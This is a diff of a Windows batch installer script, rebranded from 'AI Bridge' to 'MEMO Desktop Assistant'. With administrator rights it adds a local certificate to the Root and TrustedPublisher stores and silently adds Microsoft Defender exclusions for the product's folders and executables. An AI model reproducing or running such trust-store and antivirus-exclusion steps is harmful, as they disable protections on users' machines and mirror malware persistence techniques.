@@ -1,11 +1,11 @@
 @echo off
-:: AI Bridge - Digital Certificate Automated Installation Script
+:: MEMO Desktop Assistant - Digital Certificate Automated Installation Script
 setlocal enabledelayedexpansion
 
 net session >nul 2>&1
 if %errorLevel% neq 0 (
     echo ======================================================================
-    echo AI BRIDGE DIGITAL CERTIFICATE INSTALLATION
+    echo MEMO DESKTOP ASSISTANT DIGITAL CERTIFICATE INSTALLATION
     echo ======================================================================
     echo Requesting Administrator privileges to register certificate...
     echo.
@@ -14,24 +14,28 @@ if %errorLevel% neq 0 (
 )
 
 echo ======================================================================
-echo INSTALLING AI BRIDGE DIGITAL CERTIFICATE INTO WINDOWS
+echo INSTALLING MEMO DESKTOP ASSISTANT DIGITAL CERTIFICATE INTO WINDOWS
 echo ======================================================================
 echo.
 
-set CERT_FILE=%~dp0AIBrainDevCert.crt
+set CERT_FILE=%~dp0memo-certificate.crt
+if not exist "%CERT_FILE%" set CERT_FILE=%~dp0certs\memo-certificate.crt
+if not exist "%CERT_FILE%" set CERT_FILE=%~dp0AIBrainDevCert.crt
 if not exist "%CERT_FILE%" set CERT_FILE=%~dp0certs\AIBrainDevCert.crt
 if not exist "%CERT_FILE%" set CERT_FILE=%~dp0AIBridgeDevCert.crt
 if not exist "%CERT_FILE%" set CERT_FILE=%~dp0certs\AIBridgeDevCert.crt
 
 if not exist "%CERT_FILE%" (
-    echo Error: AIBrainDevCert.crt file not found in this folder.
+    echo Error: memo-certificate.crt file not found in this folder.
     echo Make sure the certificate is in the same directory as this script.
     echo.
     pause
     exit /b 1
 )
 
-echo 1. Cleaning previous AI Bridge certificates from Windows store...
+echo 1. Cleaning previous certificates from Windows store...
+certutil -delstore "Root" "memo-certificate" >nul 2>&1
+certutil -delstore "TrustedPublisher" "memo-certificate" >nul 2>&1
 certutil -delstore "Root" "AIBridgeDevCert" >nul 2>&1
 certutil -delstore "TrustedPublisher" "AIBridgeDevCert" >nul 2>&1
 certutil -delstore "Root" "AI Bridge Dev" >nul 2>&1
@@ -44,11 +48,11 @@ echo 3. Registering in Trusted Publishers...
 certutil -addstore -f "TrustedPublisher" "%CERT_FILE%" >nul 2>&1
 
 echo 4. Registering Microsoft Defender Antivirus exclusions...
-powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -Command "Add-MpPreference -ExclusionPath '%ProgramFiles(x86)%\MEMO', '%ProgramFiles%\MEMO' -ErrorAction SilentlyContinue; Add-MpPreference -ExclusionProcess 'memo.exe', 'updater.exe' -ErrorAction SilentlyContinue" >nul 2>&1
+powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -Command "Add-MpPreference -ExclusionPath '%ProgramFiles%\MEMO-DA', '%ProgramFiles(x86)%\MEMO', '%ProgramFiles%\MEMO' -ErrorAction SilentlyContinue; Add-MpPreference -ExclusionProcess 'memo-da.exe', 'memo.exe', 'updater.exe' -ErrorAction SilentlyContinue" >nul 2>&1
 
 echo ======================================================================
 echo CERTIFICATE REGISTERED SUCCESSFULLY!
 echo ======================================================================
-echo Windows will now trust AI Bridge installer and executables.
+echo Windows will now trust MEMO Desktop Assistant installer and executables.
 echo.
 if "%~1" neq "/silent" pause
